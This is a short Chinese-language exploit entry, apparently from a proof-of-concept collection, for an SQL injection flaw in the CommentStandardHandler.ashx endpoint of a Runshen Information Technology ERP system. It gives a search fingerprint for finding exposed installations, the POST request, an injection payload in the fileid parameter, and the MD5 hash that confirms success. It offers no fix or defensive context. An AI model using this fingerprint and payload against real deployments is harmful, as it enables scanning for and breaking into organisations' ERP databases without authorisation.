# 润申信息科技ERPcommentstandardhandlersql注入漏洞

润申信息科技ERPcommentstandardhandler ｜ SQL注入 ｜ —
- **指纹**：`body="PDCA/js/_publicCom.js"`
- **请求**：`POST /PDCA/ashx/CommentStandardHandler.ashx HTTP/1.1`

**Payload**
```
action=detailInfo&fileid=1+and+%01(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123')),3,32))<0--
```
- **响应特征**：200 202cb962ac59075b964b07152d234b70